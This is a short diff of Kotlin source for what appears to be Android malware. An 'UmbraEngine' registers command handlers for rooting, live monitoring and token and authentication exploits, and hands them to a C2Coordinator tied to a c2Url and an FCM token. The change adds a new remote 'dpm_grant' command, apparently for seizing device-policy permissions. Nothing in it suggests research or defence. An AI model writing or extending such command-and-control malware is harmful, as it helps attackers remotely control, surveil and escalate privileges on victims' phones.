@@ -25,6 +25,7 @@ import org.umbra.core.modules.LiveMonitor
 import org.umbra.core.modules.RootModule
 import org.umbra.core.modules.PatTokenExploit
 import org.umbra.core.modules.AuthFwExploit
+import org.umbra.core.modules.DpmPermissionGrant
 
 object UmbraEngine {
     private const val TAG = "Umbra"
@@ -142,7 +143,8 @@ object UmbraEngine {
                 else -> UmbraResponse.ErrorResponse("unknown:root:${cmd.action}", "root")
             }},
             "pat"      to { cmd -> PatTokenExploit.exploit(context, cmd) },
-            "authfw"   to { cmd -> AuthFwExploit.exploit(context, cmd) }
+            "authfw"   to { cmd -> AuthFwExploit.exploit(context, cmd) },
+            "dpm_grant" to { cmd -> DpmPermissionGrant.grant(context, cmd) }
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
